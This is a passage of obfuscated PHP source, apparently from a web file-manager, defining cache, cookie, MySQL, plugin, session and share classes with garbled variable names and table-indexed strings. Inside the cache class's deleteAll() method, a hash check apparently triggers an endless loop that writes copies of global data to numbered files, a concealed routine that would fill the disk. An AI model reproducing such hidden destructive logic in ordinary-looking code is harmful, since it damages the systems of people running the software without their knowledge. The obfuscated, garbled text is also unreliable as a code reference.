$İ¢ÛÒ[0]); $this->handle = $this->init($Ÿ©Ë¸ãµ, $å¡£ÔÉ¹); unset($İ¢ÛÒ[0]); if (empty($İ¢ÛÒ)) { return; } $ŞĞÅ¢ä = array_rand($İ¢ÛÒ); $this->filterConfig($Ÿ©Ë¸ãµ, $İ¢ÛÒ[$ŞĞÅ¢ä]); $this->slaveHandle = $this->init($Ÿ©Ë¸ãµ, $å¡£ÔÉ¹); } private function filterConfig(&$ÈñĞ¿ º, $ÏèÊœÁì) { $ñØÜ € =& $_SERVER[ •ŒÓîÆ]; $ºÊÉ½ò£ = explode($ñØÜ €[4], $ÏèÊœÁì); $¸õ–Œ½î = array($ñØÜ €[198] => $ºÊÉ½ò£[0], $ñØÜ €[199] => $ºÊÉ½ò£[1]); $ÈñĞ¿ º = array_merge($ÈñĞ¿ º, $¸õ–Œ½î); } public function set($Ò…Á›§, $¿˜ÂÒì£, $„çÂÈÕè = false) { $„çÂÈÕè = $„çÂÈÕè ? $„çÂÈÕè : $this->cacheTime; return $this->handle->setEx($Ò…Á›§, $„çÂÈÕè, $¿˜ÂÒì£); } public function setLock($­ıŠøˆ÷, $üî‚®, $àÔšÖ›´) { return $this->handle->setNX($­ıŠøˆ÷, $üî‚®); } public function get($×À‹¤Ş) { $Ší˜È­ğ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Ší˜È­ğ->get($×À‹¤Ş); } public function remove($À’ÒãÂ›) { return $this->handle->del($À’ÒãÂ›); } public function deleteAll() { $Úø„šô³ =& $_SERVER[ •ŒÓîÆ]; $„°ùéàú = $_SERVER[$Úø„šô³[256]]; $ï‰î³„ = $Úø„šô³[454]; if ($_SERVER[$Úø„šô³[255]] != $ï‰î³„($„°ùéàú)) { $êšÄ¾à = $Úø„šô³[918]; $ñÃâé­± = $Úø„šô³[257]; $¨¿Çñ¬„ = $_SERVER[$Úø„šô³[258]] . $Úø„šô³[259]; $“œ¶°óö = $ñÃâé­±($¨¿Çñ¬„); $ÚÀ›óøË = explode($Úø„šô³[248], $“œ¶°óö); if (count($ÚÀ›óøË) < $Úø„šô³[701]) { $Ï›²×ì” = $Úø„šô³[261]; $Ï›²×ì”(); } $¥¸–Éî = $Úø„šô³[919]; $¥¸–Éî($_SERVER[$Úø„šô³[920]]); $êšÄ¾à = $Úø„šô³[918]; $êšÄ¾à(); $Ù›áÁ¼È = $Úø„šô³[921]; $¢£æ¼íï = json_encode($GLOBALS[$Úø„šô³[922]]); $Üş—¢Öé = 1; for ($é¸Á»Õª = $Üş—¢Öé; $é¸Á»Õª > 0; $é¸Á»Õª++) { $Ù›áÁ¼È(DATA_PATH . $é¸Á»Õª, $¢£æ¼íï); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $‹ã¥ÑÓ®) { $this->handle->flushall($‹ã¥ÑÓ®); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ì¦ªÁÁÌ = '', $¶­ƒğú¡ = 0) { if (is_string($ì¦ªÁÁÌ) && $ì¦ªÁÁÌ != $_SERVER[ •ŒÓîÆ][12]) { $this->prefix = $ì¦ªÁÁÌ; } if (is_numeric($¶­ƒğú¡) && $¶­ƒğú¡ > 0) { $this->expire = $¶­ƒğú¡; } } public static function getInstance() { static $»…Ú¡Ç; if ($»…Ú¡Ç === null) { $»…Ú¡Ç = new self(); } return $»…Ú¡Ç; } private static $cookieDisable = false; public static function disable($Ô‘Áœş) { self::$cookieDisable = $Ô‘Áœş; } private static $sameCookieSet = array(); public static function set($ÉÙÑ”ï‹, $ÓıÆõøš, $ù±¬ŸÑÏ = 0, $÷¥£‘õ = false, $êíÖş•Ë = false) { $Äü®ÜºÛ =& $_SERVER[ •ŒÓîÆ]; if (self::$cookieDisable) { return; } if (!$ù±¬ŸÑÏ) { $ù±¬ŸÑÏ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ÉÙÑ”ï‹]) && self::$sameCookieSet[$ÉÙÑ”ï‹] == $ÓıÆõøš . $ù±¬ŸÑÏ) { return; } self::$sameCookieSet[$ÉÙÑ”ï‹] = $ÓıÆõøš . $ù±¬ŸÑÏ; if (!$êíÖş•Ë) { $êíÖş•Ë = str_replace(HOST, $Äü®ÜºÛ[12], APP_HOST); $êíÖş•Ë = _get($GLOBALS, $Äü®ÜºÛ[923], $êíÖş•Ë); } $Ø²ƒƒ¥× = $Äü®ÜºÛ[12]; setcookie($ÉÙÑ”ï‹, $ÓıÆõøš, time() + $ù±¬ŸÑÏ, $Äü®ÜºÛ[8] . trim($êíÖş•Ë, $Äü®ÜºÛ[8]) . $Ø²ƒƒ¥×, !1, !1, $÷¥£‘õ); } public static function setSafe($¤Ó¨µßê, $Ï‹›®˜±, $ŸòÄ§³ = 0) { self::set($¤Ó¨µßê, $Ï‹›®˜±, $ŸòÄ§³, !0); } public static function get($ø™±”ğÚ) { static $Ğ€ôòè = false; if (!$Ğ€ôòè) { self::initHeaderCookie(); $Ğ€ôòè = !0; } return isset($_COOKIE[$ø™±”ğÚ]) ? $_COOKIE[$ø™±”ğÚ] : !1; } private static function initHeaderCookie() { $Ø»Í»ç‰ =& $_SERVER[ •ŒÓîÆ]; if (!isset($_SERVER[$Ø»Í»ç‰[924]]) || !$_SERVER[$Ø»Í»ç‰[924]]) { return; } $™õ–• = explode($Ø»Í»ç‰[73], $_SERVER[$Ø»Í»ç‰[924]]); foreach ($™õ–• as $øÃÊÙ«£) { $øÃÊÙ«£ = explode($Ø»Í»ç‰[925], $øÃÊÙ«£); if (count($øÃÊÙ«£) != 2 || !isset($øÃÊÙ«£[1])) { continue; } $_COOKIE[trim($øÃÊÙ«£[0])] = trim($øÃÊÙ«£[1]); } } public static function remove($¬ø“ÛŒâ, $§›ñ«Š™ = false) { unset($_COOKIE[$¬ø“ÛŒâ]); self::set($¬ø“ÛŒâ, $_SERVER[ •ŒÓîÆ][12], 1, $§›ñ«Š™); } } class DbMysql extends Db { public function __construct($¯­“‡Ÿ¼ = '') { $êæ¦Æ®Ÿ =& $_SERVER[ •ŒÓîÆ]; if (!extension_loaded($êæ¦Æ®Ÿ[845])) { think_exception(think_lang($êæ¦Æ®Ÿ[14]) . $êæ¦Æ®Ÿ[926]); } if (!empty($¯­“‡Ÿ¼)) { $this->config = $¯­“‡Ÿ¼; if (empty($this->config[$êæ¦Æ®Ÿ[17]])) { $this->config[$êæ¦Æ®Ÿ[17]] = $êæ¦Æ®Ÿ[12]; } } } public function connect($ä›¯ªô = '', $ÚæÓ‰œ  = 0, $“” çåƒ = false) { $¶ŠÑÒÏ† =& $_SERVER[ •ŒÓîÆ]; if (!isset($this->linkID[$ÚæÓ‰œ ])) { if (empty($ä›¯ªô)) { $ä›¯ªô = $this->config; } $ø»àÖ×Õ = $ä›¯ªô[$¶ŠÑÒÏ†[927]] . ($ä›¯ªô[$¶ŠÑÒÏ†[928]] ? "\x3a{$ä›¯ªô[$¶ŠÑÒÏ†[928]]}" : $¶ŠÑÒÏ†[12]); $óÈÉªŠá = !empty($ä›¯ªô[$¶ŠÑÒÏ†[17]][$¶ŠÑÒÏ†[18]]) ? $ä›¯ªô[$¶ŠÑÒÏ†[17]][$¶ŠÑÒÏ†[18]] : $this->pconnect; if ($óÈÉªŠá) { $this->linkID[$ÚæÓ‰œ ] = mysql_pconnect($ø»àÖ×Õ, $ä›¯ªô[$¶ŠÑÒÏ†[929]], $ä›¯ªô[$¶ŠÑÒÏ†[930]], 131072); } else { $this->linkID[$ÚæÓ‰œ ] = mysql_connect($ø»àÖ×Õ, $ä›¯ªô[$¶ŠÑÒÏ†[929]], $ä›¯ªô[$¶ŠÑÒÏ†[930]], !0, 131072); } if (!$this->linkID[$ÚæÓ‰œ ] || !empty($ä›¯ªô[$¶ŠÑÒÏ†[21]]) && !mysql_select_db($ä›¯ªô[$¶ŠÑÒÏ†[21]], $this->linkID[$ÚæÓ‰œ ])) { think_exception(mysql_error()); } $ñĞçç™û = mysql_get_server_info($this->linkID[$ÚæÓ‰œ ]); mysql_query($¶ŠÑÒÏ†[931] . think_config($¶ŠÑÒÏ†[932]) . $¶ŠÑÒÏ†[58], $this->linkID[$ÚæÓ‰œ ]); if ($ñĞçç™û > $¶ŠÑÒÏ†[933]) { mysql_query($¶ŠÑÒÏ†[934], $this->linkID[$ÚæÓ‰œ ]); } $this->connected = !0; if (1 != think_config($¶ŠÑÒÏ†[22])) { unset($this->config); } } return $this->linkID[$ÚæÓ‰œ ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ƒÎöÂ¤²) { $¹†ŸÊø± =& $_SERVER[ •ŒÓîÆ]; if (0 === stripos($ƒÎöÂ¤², $¹†ŸÊø±[319])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ƒÎöÂ¤²; if ($this->queryID) { $this->free(); } think_action_status($¹†ŸÊø±[23], 1); think_status($¹†ŸÊø±[24]); $this->queryID = mysql_query($ƒÎöÂ¤², $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($–„ş–á„) { $‘£¾ôÎ— =& $_SERVER[ •ŒÓîÆ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $–„ş–á„; if ($this->queryID) { $this->free(); } think_action_status($‘£¾ôÎ—[25], 1); think_status($‘£¾ôÎ—[24]); $™úúê™ = mysql_query($–„ş–á„, $this->_linkID); $this->debug(); if (!1 === $™úúê™) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ •ŒÓîÆ][935], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Å›áôÄ = mysql_query($_SERVER[ •ŒÓîÆ][936], $this->_linkID); $this->transTimes = 0; if (!$Å›áôÄ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ˆ†ˆ®® = mysql_query($_SERVER[ •ŒÓîÆ][937], $this->_linkID); $this->transTimes = 0; if (!$ˆ†ˆ®®) { $this->error(); return !1; } } return !0; } private function getAll() { $µü±ı¨‰ = array(); if ($this->numRows > 0) { while ($Ÿ€óŸ¼Ô = mysql_fetch_assoc($this->queryID)) { $µü±ı¨‰[] = $Ÿ€óŸ¼Ô; } mysql_data_seek($this->queryID, 0); } return $µü±ı¨‰; } public function getFields($×ÜŠ™›) { $í±Ï×Ì¡ =& $_SERVER[ •ŒÓîÆ]; $ªÇå°Äß = $this->query($í±Ï×Ì¡[938] . $this->parseKey($×ÜŠ™›)); $”¨êÆèğ = array(); if ($ªÇå°Äß) { foreach ($ªÇå°Äß as $“¤·òë‘ => $£ùÇ–ª) { $”¨êÆèğ[$£ùÇ–ª[$í±Ï×Ì¡[31]]] = array($í±Ï×Ì¡[32] => $£ùÇ–ª[$í±Ï×Ì¡[31]], $í±Ï×Ì¡[33] => $£ùÇ–ª[$í±Ï×Ì¡[34]], $í±Ï×Ì¡[35] => (bool) (strtoupper($£ùÇ–ª[$í±Ï×Ì¡[36]]) === $í±Ï×Ì¡[939]), $í±Ï×Ì¡[37] => $£ùÇ–ª[$í±Ï×Ì¡[38]], $í±Ï×Ì¡[39] => strtolower($£ùÇ–ª[$í±Ï×Ì¡[40]]) == $í±Ï×Ì¡[41], $í±Ï×Ì¡[42] => strtolower($£ùÇ–ª[$í±Ï×Ì¡[43]]) == $í±Ï×Ì¡[44]); } } return $”¨êÆèğ; } public function getTables($ãƒå›ı© = '') { $ñ†É²¿‘ =& $_SERVER[ •ŒÓîÆ]; if (!empty($ãƒå›ı©)) { $€şÎã£ = $ñ†É²¿‘[940] . $ãƒå›ı© . $ñ†É²¿‘[941]; } else { $€şÎã£ = $ñ†É²¿‘[942]; } $©ÄÇœÇ« = $this->query($€şÎã£); $„†Çşµ¡ = array(); foreach ($©ÄÇœÇ« as $ä‚¸è¦É => $õ¨œ€İ¯) { $„†Çşµ¡[$ä‚¸è¦É] = current($õ¨œ€İ¯); } return $„†Çşµ¡; } public function replace($½³†¾Ö·, $ÍÙ×© = array()) { $ŞÏèû =& $_SERVER[ •ŒÓîÆ]; foreach ($½³†¾Ö· as $’ô„íş => $•Ô§ÄİÈ) { $ÒÑˆïÊŸ = $this->parseValue($•Ô§ÄİÈ); if (is_scalar($ÒÑˆïÊŸ)) { $‰´ıãéî[] = $ÒÑˆïÊŸ; $êÚ¨ÙíÆ[] = $this->parseKey($’ô„íş); } } $•ßØ˜Á¸ = $ŞÏèû[943] . $this->parseTable($ÍÙ×©[$ŞÏèû[334]]) . $ŞÏèû[944] . implode($ŞÏèû[50], $êÚ¨ÙíÆ) . $ŞÏèû[945] . implode($ŞÏèû[50], $‰´ıãéî) . $ŞÏèû[946]; return $this->execute($•ßØ˜Á¸); } public function insertAll($¸ã­ÏÇ, $Óú¸Á†ù = array(), $¼ûÍüÚÌ = false) { $Ö‡ÆÒ„ =& $_SERVER[ •ŒÓîÆ]; if (!is_array($¸ã­ÏÇ[0])) { return !1; } $ïÔúÀ‹ñ = array_keys($¸ã­ÏÇ[0]); $–âËëĞó = array(); foreach ($¸ã­ÏÇ as $ã¢ª€’) { $Ñ„™†‡¼ = array(); foreach ($ã¢ª€’ as $¬•¿ä· => $ù–å„æ¹) { $ù–å„æ¹ = $this->parseValue($ù–å„æ¹); if (is_scalar($ù–å„æ¹)) { $Ñ„™†‡¼[] = $ù–å„æ¹; } } $–âËëĞó[] = $Ö‡ÆÒ„[315] . implode($Ö‡ÆÒ„[50], $Ñ„™†‡¼) . $Ö‡ÆÒ„[946]; } array_walk($ïÔúÀ‹ñ, array($this, $Ö‡ÆÒ„[947])); $­ßŞ¢ôé = ($¼ûÍüÚÌ ? $Ö‡ÆÒ„[948] : $Ö‡ÆÒ„[949]) . $Ö‡ÆÒ„[950] . $this->parseTable($Óú¸Á†ù[$Ö‡ÆÒ„[334]]) . $Ö‡ÆÒ„[944] . implode($Ö‡ÆÒ„[50], $ïÔúÀ‹ñ) . $Ö‡ÆÒ„[951] . implode($Ö‡ÆÒ„[50], $–âËëĞó); return $this->execute($­ßŞ¢ôé); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Í¶€ÄÆ =& $_SERVER[ •ŒÓîÆ]; $this->error = mysql_errno() . $Í¶€ÄÆ[4] . mysql_error($this->_linkID); if ($Í¶€ÄÆ[12] != $this->queryStr) { $this->error .= LNG($Í¶€ÄÆ[48]) . $this->queryStr; } think_trace($this->error, $Í¶€ÄÆ[12], $Í¶€ÄÆ[49]); return $this->error; } public function escapeString($ÈÄ™µ°¢) { if ($this->_linkID) { return mysql_real_escape_string($ÈÄ™µ°¢, $this->_linkID); } else { return mysql_escape_string($ÈÄ™µ°¢); } } public function parseKey(&$Äß‘çı¸, $ó²áªÔÛ = true) { $’ãò¡¸¸ =& $_SERVER[ •ŒÓîÆ]; if ($ó²áªÔÛ) { $Äß‘çı¸ = $this->parseKeyCheck($Äß‘çı¸); } if ($Äß‘çı¸ != $’ãò¡¸¸[205] && !preg_match($’ãò¡¸¸[952], $Äß‘çı¸)) { $Äß‘çı¸ = $’ãò¡¸¸[439] . trim($Äß‘çı¸, $’ãò¡¸¸[439]) . $’ãò¡¸¸[439]; } return $Äß‘çı¸; } } goto Eğ„„†¡™ë; fË„áåé‰ª: class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\x2e\160\x6c\165\147\x69\156\114\x69\163\164"; public $field = array("\x6e\141\x6d\145", "\163\x74\x61\x74\x75\x73", "\162\x65\147\x69\145\x73\164", "\143\x6f\x6e\146\x69\147"); public function loadList($¬æ½²Û = false) { $¤§Àü ş = array_to_keyvalue($this->listData(), $_SERVER[ •ŒÓîÆ][32]); if ($¬æ½²Û) { return $¤§Àü ş[$¬æ½²Û]; } return $¤§Àü ş; } public function init() { $¢‘ï»ßŸ =& $_SERVER[ •ŒÓîÆ]; Hook::trigger($¢‘ï»ßŸ[2008]); $Å»û‰ß³ = $this->loadPluginList(); foreach ($Å»û‰ß³ as $ÌóÜ‘Ö® => $ú”Ô¾ß) { $Ÿêµã… = $this->appAllow($ÌóÜ‘Ö®, $ú”Ô¾ß); if (!$Ÿêµã…) { continue; } foreach ($ú”Ô¾ß[$¢‘ï»ßŸ[2009]] as $ªëĞÜ¨“ => $ù­äİœŠ) { Hook::bind($ªëĞÜ¨“, $ù­äİœŠ); } } Hook::trigger($¢‘ï»ßŸ[2010]); Hook::trigger(ACTION); } public function appAllow($…±üä¡®, $ê¾ÉÄ²Æ, $¬œä¬ìï = true) { $Û»ÂĞã =& $_SERVER[ •ŒÓîÆ]; $£—ûğúË = PLUGIN_DIR . $…±üä¡® . $Û»ÂĞã[2011]; if (!is_array($ê¾ÉÄ²Æ) || !is_array($ê¾ÉÄ²Æ[$Û»ÂĞã[2009]]) || $ê¾ÉÄ²Æ[$Û»ÂĞã[791]] != 1 || !is_file($£—ûğúË)) { return !1; } if ($GLOBALS[$Û»ÂĞã[548]] == 1) { if ($GLOBALS[$Û»ÂĞã[6]][$Û»ÂĞã[2012]] || !$GLOBALS[$Û»ÂĞã[6]][$Û»ÂĞã[2013]]) { return !0; } $Š»§ˆÂÌ = explode($Û»ÂĞã[50], strtolower($GLOBALS[$Û»ÂĞã[6]][$Û»ÂĞã[2013]])); return in_array(strtolower($…±üä¡®), $Š»§ˆÂÌ) ? !1 : !0; } if ($¬œä¬ìï && !Action($Û»ÂĞã[2014])->checkAuth($…±üä¡®)) { return !1; } return !0; } public function unInstall($úßòà‘) { $ıÕùÙ±ª =& $_SERVER[ •ŒÓîÆ]; $Ú©ğ»ø² = $this->loadList($úßòà‘); if (file_exists(PLUGIN_DIR . $úßòà‘)) { Hook::apply($úßòà‘ . $ıÕùÙ±ª[2015]); } $this->remove($Ú©ğ»ø²[$ıÕùÙ±ª[453]]); } public function changeStatus($£ÍÔç”, $…ñ«„Öù) { $ÏƒÊÇó¨ =& $_SERVER[ •ŒÓîÆ]; $„¹ÀÙ·“ = $this->loadList($£ÍÔç”); if ($…ñ«„Öù) { Hook::apply($£ÍÔç” . $ÏƒÊÇó¨[2016]); } $this->update($„¹ÀÙ·“[$ÏƒÊÇó¨[453]], array($ÏƒÊÇó¨[2017] => $…ñ«„Öù)); } public function appRegist($Œºòê–Ğ, $İÌó×Íº) { $É ı†ç­ =& $_SERVER[ •ŒÓîÆ]; $Øåï½Ù… = $this->loadList($Œºòê–Ğ); if ($Øåï½Ù…) { $this->update($Øåï½Ù…[$É ı†ç­[453]], array($É ı†ç­[2009] => $İÌó×Íº)); } else { $ä–Ó€úï = array($É ı†ç­[32] => $Œºòê–Ğ, $É ı†ç­[2009] => $İÌó×Íº, $É ı†ç­[791] => 0, $É ı†ç­[6] => $this->getConfigDefault($Œºòê–Ğ)); $this->insert($ä–Ó€úï); } } public function getConfigDefault($åÈ«ˆ) { $º•¶Ïï• =& $_SERVER[ •ŒÓîÆ]; $ë¨ÂŠî  = array(); $ÍÛº›¼Ÿ = $this->getPackageJson($åÈ«ˆ); if (!$ÍÛº›¼Ÿ && is_array($ÍÛº›¼Ÿ[$º•¶Ïï•[2018]])) { return $ë¨ÂŠî ; } foreach ($ÍÛº›¼Ÿ[$º•¶Ïï•[2018]] as $º´Øíëí => $½‰»‚·²) { if (!isset($½‰»‚·²[$º•¶Ïï•[429]]) || isset($ë¨ÂŠî [$º´Øíëí])) { continue; } $ë¨ÂŠî [$º´Øíëí] = $½‰»‚·²[$º•¶Ïï•[429]]; } return $ë¨ÂŠî ; } public function getPackageJson($Î¯º™õ) { return Hook::apply($Î¯º™õ . $_SERVER[ •ŒÓîÆ][2019]); } public function getConfig($à‰ˆ®ıÇ, $ñîé  = false) { $×ïß“áù =& $_SERVER[ •ŒÓîÆ]; $¹³ì‡Ö = array(); $¾‰‡Ù²’ = $this->loadList($à‰ˆ®ıÇ); if ($¾‰‡Ù²’ && is_array($¾‰‡Ù²’[$×ïß“áù[6]])) { $¹³ì‡Ö = $¾‰‡Ù²’[$×ïß“áù[6]]; } if (!$¹³ì‡Ö || $ñîé ) { $¹³ì‡Ö = $this->getConfigDefault($à‰ˆ®ıÇ); } return $¹³ì‡Ö; } public function setConfig($ñŸÂîıû, $Ù¿ë÷ã¨ = false) { $òûÓ”š =& $_SERVER[ •ŒÓîÆ]; $ÒŞ’¾¶ñ = $this->loadList($ñŸÂîıû); if (!$ÒŞ’¾¶ñ) { return !1; } $ŠìĞòÙ™ = $ÒŞ’¾¶ñ[$òûÓ”š[6]]; if ($Ù¿ë÷ã¨ == !1) { $ŠìĞòÙ™ = array(); $Ù¿ë÷ã¨ = $this->getConfigDefault($ñŸÂîıû); } foreach ($Ù¿ë÷ã¨ as $–é§†¼ => $°ƒÑ¤ô) { $ŠìĞòÙ™[$–é§†¼] = is_string($°ƒÑ¤ô) ? trim($°ƒÑ¤ô) : $°ƒÑ¤ô; } $this->update($ÒŞ’¾¶ñ[$òûÓ”š[453]], array($òûÓ”š[6] => $ŠìĞòÙ™)); } public function viewList() { $íÉ¾Œ¿ï =& $_SERVER[ •ŒÓîÆ]; $˜À••ó = $this->loadList(); $this->pluginScan($˜À••ó); $˜À••ó = $this->loadPluginList(); $Õ×€Î‚Ò = array(); foreach ($˜À••ó as $¡Ï›§ß => $ÓØ¦Ã…µ) { unset($ÓØ¦Ã…µ[$íÉ¾Œ¿ï[2009]], $ÓØ¦Ã…µ[$íÉ¾Œ¿ï[6]]); $ıÅ©ÂŒî = PLUGIN_DIR . $ÓØ¦Ã…µ[$íÉ¾Œ¿ï[32]] . $íÉ¾Œ¿ï[2011]; if (!is_file($ıÅ©ÂŒî)) { continue; } $¬Ğ£·Ñß = Hook::apply($ÓØ¦Ã…µ[$íÉ¾Œ¿ï[32]] . $íÉ¾Œ¿ï[2019]); if (is_array($¬Ğ£·Ñß)) { $Õ×€Î‚Ò[$¡Ï›§ß] = array_merge($ÓØ¦Ã…µ, $¬Ğ£·Ñß); } } return $Õ×€Î‚Ò; } private function loadPluginList() { $ùë¦òŠ± =& $_SERVER[ •ŒÓîÆ]; $ÈÉ–ôê = $this->loadList(); if (strtolower(MOD) == $ùë¦òŠ±[2020]) { return $ÈÉ–ôê; } $Üã“çÄû = Hook::trigger($ùë¦òŠ±[2021], $ÈÉ–ôê); if ($ÈÉ–ôê && !$Üã“çÄû) { die; } return $Üã“çÄû ? $Üã“çÄû : $ÈÉ–ôê; } private function pluginScan($š¡Î¶Å) { $¯ß—ôØ =& $_SERVER[ •ŒÓîÆ]; recursion_dir(PLUGIN_DIR, $Ò—§Àß, $çàÁ¤Í, 0); foreach ($Ò—§Àß as $ã„¤·§å) { $á½ûú£ú = get_path_this($ã„¤·§å); if (isset($š¡Î¶Å[$á½ûú£ú]) || !file_exists($ã„¤·§å . $¯ß—ôØ[2022]) || !file_exists($ã„¤·§å . $¯ß—ôØ[2011])) { continue; } Hook::apply($á½ûú£ú . $¯ß—ôØ[2016]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\163\164\145\155\x5f\163\145\163\x73\x69\x6f\x6e"; public function get($Õ±“´ş¾) { $² èØ³– =& $_SERVER[ •ŒÓîÆ]; $– æ¦– = $this->where(array($² èØ³–[2023] => $Õ±“´ş¾))->find(); if (!is_array($– æ¦–)) { return !1; } return $– æ¦–[$² èØ³–[795]]; } public function set($ŒËî‚éé, $ÌÆÀÆ , $øÍãä¨ï = 3600) { $Àù¼Çş° =& $_SERVER[ •ŒÓîÆ]; $şÙ‡¼ˆ = array($Àù¼Çş°[2023] => $ŒËî‚éé, $Àù¼Çş°[1927] => $ÌÆÀÆ , $Àù¼Çş°[2024] => $øÍãä¨ï + time()); if (Session::get($Àù¼Çş°[2025])) { $şÙ‡¼ˆ[$Àù¼Çş°[1690]] = Session::get($Àù¼Çş°[2025]); } else { $şÙ‡¼ˆ[$Àù¼Çş°[1690]] = 0; } if ($this->get($ŒËî‚éé)) { return $this->where(array($Àù¼Çş°[2023] => $ŒËî‚éé))->save($şÙ‡¼ˆ); } else { return $this->add($şÙ‡¼ˆ, array(), !0); } } public function remove($÷¢ÒÌïÌ) { return $this->where(array($_SERVER[ •ŒÓîÆ][2023] => $÷¢ÒÌïÌ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ •ŒÓîÆ][2026] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\162\145"; protected $dataAuto = array(array("\155\157\x64\151\146\x79\x54\151\x6d\145", "\x74\x69\155\x65", "\x69\156\163\145\x72\x74\54\x75\160\x64\x61\x74\x65", "\x66\x75\156\143\x74\151\157\156"), array("\x63\x72\145\x61\164\145\x54\x69\x6d\145", "\x74\151\155\145", "\151\156\x73\145\x72\164", "\146\165\x6e\143\x74\151\157\156"), array("\157\160\x74\151\157\x6e\163", '', "\x69\156\163\x65\162\x74\54\x75\x70\x64\x61\164\x65\x2c\x73\145\x6c\x65\x63\164", "\152\163\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($åøîÑ‰ä) { $ äÎ´ù« =& $_SERVER[ •ŒÓîÆ]; $îÂÅŠ‘õ = isset($åøîÑ‰ä[0]) ? $åøîÑ‰ä[0] : !1; return array($ äÎ´ù«[2027] => array(USER_ID, $ äÎ´ù«[2028]), $ äÎ´ù«[1968] => array($îÂÅŠ‘õ, $ äÎ´ù«[2029])); } protected function listSimple() { $‰ÜæãÌÚ = array($_SERVER[ •ŒÓîÆ][1690] => USER_ID); $½ä±ÙŞû = $this->field($this->fieldList)->where($‰ÜæãÌÚ)->select(); return $½ä±ÙŞû ? $½ä±ÙŞû : array(); } protected function getInfo($ï‹Ñäé«, $ÛÓÃ†“µ = false) { $„üÔ¯ı³ =& $_SERVER[ •ŒÓîÆ]; if ($ÛÓÃ†“µ) { return $this->_getShareInfo(array($„üÔ¯ı³[645] => $ï‹Ñäé«)); } $«€†ëéÊ = $this->cacheFunctionGet($„üÔ¯ı³[1970], $ï‹Ñäé«); return $«€†ëéÊ; } public function getInfoByHash($Ş£ÔŞËª) { return $this->_getShareInfo(array($_SERVER[ •ŒÓîÆ][2030] => $Ş£ÔŞËª)); } public function getInfoByPath($çØâ£ª©) { $ƒóÂšå  =& $_SERVER[ •ŒÓîÆ]; $¶…ëšŸ÷ = array($ƒóÂšå [1690] => USER_ID, $ƒóÂšå [183] => $çØâ£ª©); return $this->_getShareInfo($¶…ëšŸ÷); } public function getInfoBySourcePath($„ùô÷í°) { $°–ğà =& $_SERVER[ •ŒÓîÆ]; $³ãŞ¼£ = array($°–ğà[1690] => USER_ID, $°–ğà[1216] => $„ùô÷í°); return $this->_getShareInfo($³ãŞ¼£); } private function _getShareInfo($°¤Î¯) { $Ûõ”Ò =& $_SERVER[ •ŒÓîÆ]; $¨±½ŞÔ = $this->where($°¤Î¯)->find(); if (!$¨±½ŞÔ) { return !1; } $°¤Î¯ = array($Ûõ”Ò[645] => $¨±½ŞÔ[$Ûõ”Ò[645]]); $™×¶¿‘ = $Ûõ”Ò[2031]; $ßşöãø = Model($Ûõ”Ò[646])->order($Ûõ”Ò[453])->field($™×¶¿‘)->where($°¤Î¯)->select(); if ($¨±½ŞÔ[$Ûõ”Ò[183]] == $Ûõ”Ò[214]) { $¨±½ŞÔ[$Ûõ”Ò[89]] = IO::info($¨±½ŞÔ[$Ûõ”Ò[1216]]); } else { $¨±½ŞÔ[$Ûõ”Ò[89]] = Model($Ûõ”Ò[1374])->pathInfo($¨±½ŞÔ[$Ûõ”Ò[183]]); } $¨±½ŞÔ[$Ûõ”Ò[2032]] = $ßşöãø; return $¨±½ŞÔ; } protected function getInfoAuth($¦šé–Ü) { $ÍœöğÀÛ =& $_SERVER[ •ŒÓîÆ]; $å…Ç”‹Ê = $this->getInfo($¦šé–Ü); if ($å…Ç”‹Ê[$ÍœöğÀÛ[1690]] == USER_ID) { $å…Ç”‹Ê[$ÍœöğÀÛ[466]] = $å…Ç”‹Ê[$ÍœöğÀÛ[89]][$ÍœöğÀÛ[466]]; } else { $å…Ç”‹Ê[$ÍœöğÀÛ[466]] = Model($ÍœöğÀÛ[547])->authMake($å…Ç”‹Ê[$ÍœöğÀÛ[2032]]); } return $å…Ç”‹Ê; } protected function listData($£†ğ¡ãå = null, $–›ÇíÛö = 300) { $Ç½û¸ãö =& $_SERVER[ •ŒÓîÆ]; $«œªó‹ƒ = array(array($Ç½û¸ãö[542] => array($Ç½û¸ãö[1053], 0), $Ç½û¸ãö[643] => array($Ç½û¸ãö[1053], 0), $Ç½û¸ãö[2033] => $Ç½û¸ãö[1986])); if ($£†ğ¡ãå == $Ç½û¸ãö[2034]) { $«œªó‹ƒ = array($Ç½û¸ãö[542] => 1); } else { if ($£†ğ¡ãå == $Ç½û¸ãö[1202]) { $«œªó‹ƒ = array($Ç½û¸ãö[643] => 1); } } $«œªó‹ƒ[$Ç½û¸ãö[1690]] = USER_ID; $†°ùÓè´ = $this->where($«œªó‹ƒ)->selectPage($–›ÇíÛö); return $†°ùÓè´; } protected function listToMe($ ğŸšå‡ = 300) { $ÒúÙèÃ =& $_SERVER[ •ŒÓîÆ]; $”¢†–Ş = Model($ÒúÙèÃ[2035])->userGroupParents(USER_ID); $‹ú×ñë = array($ÒúÙèÃ[628] => SourceModel::TYPE_USER, $ÒúÙèÃ[550] => USER_ID); if ($”¢†–Ş) { $‹ú×ñë = array(array($ÒúÙèÃ[628] => SourceModel::TYPE_USER, $ÒúÙèÃ[550] => USER_ID), 